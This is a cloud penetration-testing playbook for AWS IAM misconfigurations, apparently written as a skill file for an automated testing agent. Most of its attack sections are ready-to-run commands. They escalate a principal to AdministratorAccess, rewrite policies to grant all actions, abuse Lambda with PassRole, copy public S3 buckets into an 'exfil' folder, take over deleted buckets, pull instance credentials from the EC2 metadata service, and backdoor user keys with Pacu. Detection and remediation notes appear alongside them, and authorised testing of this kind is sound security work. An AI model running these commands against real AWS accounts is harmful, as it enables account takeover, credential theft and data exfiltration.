# AWS IAM Misconfiguration & Cloud Pentest — Skill Playbook

**Mitre ATT&CK ID:** T1526 (Cloud Service Discovery), T1078 (Valid Accounts), T1530 (Data from Cloud Storage), T1136 (Create Account), T1552.005 (Cloud Instance Metadata API)
**OWASP Mapping:** A01:2021 – Broken Access Control, A05:2021 – Security Misconfiguration
**Severity:** Critical / High
**Last Updated:** 2026-08-02

---

## Metadata

```yaml
skill_id: aws-iam-misconfig-v2
category: cloud-security
cloud_provider: aws
author: HiveBreach
mitre_attack_id:
  - T1526
  - T1078
  - T1530
  - T1136
  - T1552.005
  - T1068
owasp_mapping:
  - A01:2021-Broken Access Control
  - A05:2021-Security Misconfiguration
tags:
  - aws
  - iam
  - cloud-security
  - privilege-escalation
  - misconfiguration
  - s3
  - lambda
  - ec2-metadata
tools:
  - aws-cli
  - prowler
  - scoutsuite
  - pacu
  - cloudsplaining
  - enumerate-iam
verification_required: sandbox
```

---

## 1. Detection

### 1.1 Enumerate IAM Entities

```bash
aws sts get-caller-identity
aws iam list-users --query "Users[*].[UserName,Arn,CreateDate]" --output table
aws iam list-roles --query "Roles[*].[RoleName,Arn]" --output table
aws iam list-policies --scope All --only-attached --output json
```

### 1.2 Enumerate Permissions

```bash
aws iam list-attached-user-policies --user-name <user>
aws iam list-groups-for-user --user-name <user>
aws iam get-role --role-name <role> --query 'Role.AssumeRolePolicyDocument'

aws iam simulate-principal-policy \
  --policy-source-arn arn:aws:iam::<acct>:user/<user> \
  --action-names iam:* ec2:* s3:* lambda:* sts:AssumeRole \
  --query 'EvaluationResults[*].[EvalActionName,EvalDecision]' --output table
```

### 1.3 Dangerous Trust and Policy Patterns

# Hunt for: {"Effect":"Allow","Principal":{"AWS":"*"},"Action":"sts:AssumeRole"}
```bash
aws iam list-roles --query 'Roles[*].RoleName' --output text | while read r; do
  aws iam get-role --role-name "$r" --query 'Role.AssumeRolePolicyDocument' --output json 2>/dev/null | \
    python3 -c "import json,sys; d=json.load(sys.stdin)
for s in d.get('Statement',[]):
    p=s.get('Principal',{})
    if '*' in str(p) or 'root' in str(p): print('TRUST-WIDE: $r ::',p)"
done
```

### 1.4 Logging and Detection Gaps

```bash
aws cloudtrail list-trails --query 'TrailList[*].[Name,IsLogging]' --output table
aws cloudtrail get-trail-status --name <trail> --query '{Logging:IsLogging,Latest:LatestCloudWatchLogsDeliveryTime}'
aws cloudtrail get-event-selectors --trail-name <trail> --query 'EventSelectors[*].IncludeManagementEvents'
```

---

## 2. Confirmation

### 2.1 Policy Simulator Validation

```bash
aws iam simulate-principal-policy \
  --policy-source-arn arn:aws:iam::<acct>:role/<role> \
  --action-names iam:CreatePolicyVersion iam:PassRole s3:GetObject \
  --query 'EvaluationResults[*].[EvalActionName,EvalDecision]' --output table
```

### 2.2 Public Resource Confirmation

```bash
aws s3 ls s3://<bucket>/ --no-sign-request
aws kms get-key-policy --key-id <key-id> --policy-name default --query 'Policy' --output json
```

### 2.3 Metadata Service Reachability

```bash
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/
TOKEN=$(curl -s -X PUT http://169.254.169.254/latest/api/token -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/
```

---

## 3. Exploitation

### 3.1 IAM Privilege Escalation (catalog)

```bash
aws iam create-access-key --user-name victim-user
aws iam attach-user-policy --user-name <user> --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
aws iam create-policy-version --policy-arn <arn> \
  --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}' \
  --set-as-default

zip -q payload.zip payload.py
aws lambda create-function --function-name esc-<id> --runtime python3.12 \
  --role <priv-role-arn> --handler payload.handler --zip-file fileb://payload.zip
aws lambda invoke --function-name esc-<id> --payload '{}' out.json

aws sts assume-role --role-arn arn:aws:iam::<acct>:role/<role> --role-session-name pentest
```

### 3.2 S3 Bucket Misconfiguration

```bash
aws s3api get-bucket-policy --bucket <b>
aws s3api get-bucket-acl --bucket <b>
aws s3 sync s3://<b>/ ./exfil/ --no-sign-request

# Takeover of deleted bucket
aws s3api create-bucket --bucket <deleted-bucket>
aws s3api put-object --bucket <deleted-bucket> --key index.html --body i.html --acl public-read
```

### 3.3 Lambda Privilege Escalation

```bash
aws lambda list-functions --query 'Functions[*].[FunctionName,Role]' --output table
for f in $(aws lambda list-functions --query 'Functions[*].FunctionName' --output text); do
  role=$(aws lambda get-function-configuration --function-name "$f" --query 'Role' --output text)
  aws iam list-attached-role-policies --role-name "$(basename $role)" \
    --query 'AttachedPolicies[*].PolicyName' --output text
done
aws lambda get-policy --function-name <func> --query 'Policy' --output json
```

### 3.4 EC2 Metadata Abuse

```bash
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>
aws ec2 describe-instances \
  --query 'Reservations[].Instances[].{Id:InstanceId,Iam:IamInstanceProfile.Arn,Meta:MetadataOptions.HttpTokens}' \
  --output table
```

### 3.5 KMS Key Issues

```bash
aws kms list-keys --query 'Keys[*].KeyId' --output text | while read k; do
  aws kms get-key-policy --key-id "$k" --policy-name default --output json 2>/dev/null
done
aws kms list-grants --key-id <key-id> --query 'Grants[*].[GrantId,GranteePrincipal,Operations]' --output table
```

---

## 4. Tool-Guidance

### 4.1 Prowler

```bash
prowler aws --services iam s3 kms cloudtrail lambda ec2 -M csv -o ./prowler-out
```

### 4.2 Pacu

```bash
pacu
Pacu > set_keys
Pacu > run iam__enum_users_roles_policies_groups
Pacu > run iam__privesc_scan
Pacu > run iam__backdoor_users_keys
Pacu > run s3__enum
Pacu > run ec2__enum
```

### 4.3 ScoutSuite / Cloudsplaining / Enumerate-IAM

```bash
scout aws --report-dir ./reports --services iam s3 kms
cloudsplaining scan --input-file /tmp/authz.json --output /tmp/cloudsplaining
python3 enumerate-iam.py --access-key AKIA... --secret-key ...
```

---

## 5. PoC Generation

### PoC Template

```markdown
## AWS Misconfiguration — [FINDING_ID]

**Resource:** arn:aws:iam::ACCOUNT:role/<role> / s3://<bucket>
**Type:** IAM privesc / S3 public / Lambda over-privilege / Metadata / KMS / Logging gap
**Chain:** [describe full chain]

### Proof
1. [exact commands run]
2. [output that confirms the finding]
3. [impact demonstrated: data accessed / admin reached]

### Remediation
- Least privilege + permission boundaries + SCP guardrails
- Block public access, add conditions, enable versioning/encryption/logging
- Enforce IMDSv2 with hop limit 1; alert on CreateFunction/AssumeRole
```

---

## 6. Verification

- [ ] All findings reproduced in isolated AWS sandbox account
- [ ] Policy JSON validated with `aws iam simulate-principal-policy`
- [ ] Cloudsplaining report cross-referenced with manual review
- [ ] Prowler and Pacu results compared
- [ ] Impact of each finding assessed (what can attacker reach)
- [ ] CloudTrail present and reviewed for attribution
- [ ] Cleanup of all test artifacts completed

---

## 7. CheatSheet

```bash
aws sts get-caller-identity
aws iam get-account-authorization-details > authz.json
cloudsplaining scan --input-file authz.json --output out
pacu > run iam__privesc_scan
aws s3 ls --no-sign-request
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

| Misconfiguration | Command | Risk |
|---|---|---|
| Wildcard trust | `get-role` AssumeRolePolicy | Cross-account takeover |
| `*:*` policy | `simulate-principal-policy` | Admin access |
| `iam:PassRole` | `get-account-authorization-details` | Escalation |
| Public bucket | `s3 ls --no-sign-request` | Data exposure |
| Lambda admin role | `list-attached-role-policies` | Escalation |
| KMS wildcard | `get-key-policy` | Key compromise |

---

## 8. Related Techniques (MITRE ATT&CK Mapping)

| Technique ID | Name | Relation |
|---|---|---|
| T1526 | Cloud Service Discovery | Enumeration |
| T1078 | Valid Accounts | Compromised credentials |
| T1530 | Data from Cloud Storage | S3 data access |
| T1136 | Create Account | Backdoor accounts/keys |
| T1068 | Exploitation for Privilege Escalation | Escalation chains |
| T1552.005 | Cloud Instance Metadata API | EC2 metadata theft |
| T1098.003 | Additional Cloud Credentials | Key/role backdoor |

---

## 9. References

- Rhino Security Labs AWS privesc: https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/
- Pacu: https://github.com/RhinoSecurityLabs/pacu
- Cloudsplaining: https://cloudsplaining.readthedocs.io/en/latest/
- Prowler: https://github.com/prowler-cloud/prowler
- ScoutSuite: https://github.com/nccgroup/ScoutSuite
- Enumerate-IAM: https://github.com/andresriancho/enumerate-iam
- AWS IAM Reference: https://docs.aws.amazon.com/IAM/latest/UserGuide/

---

*This playbook is for authorised security testing only. All verification must occur in AWS sandbox accounts.*
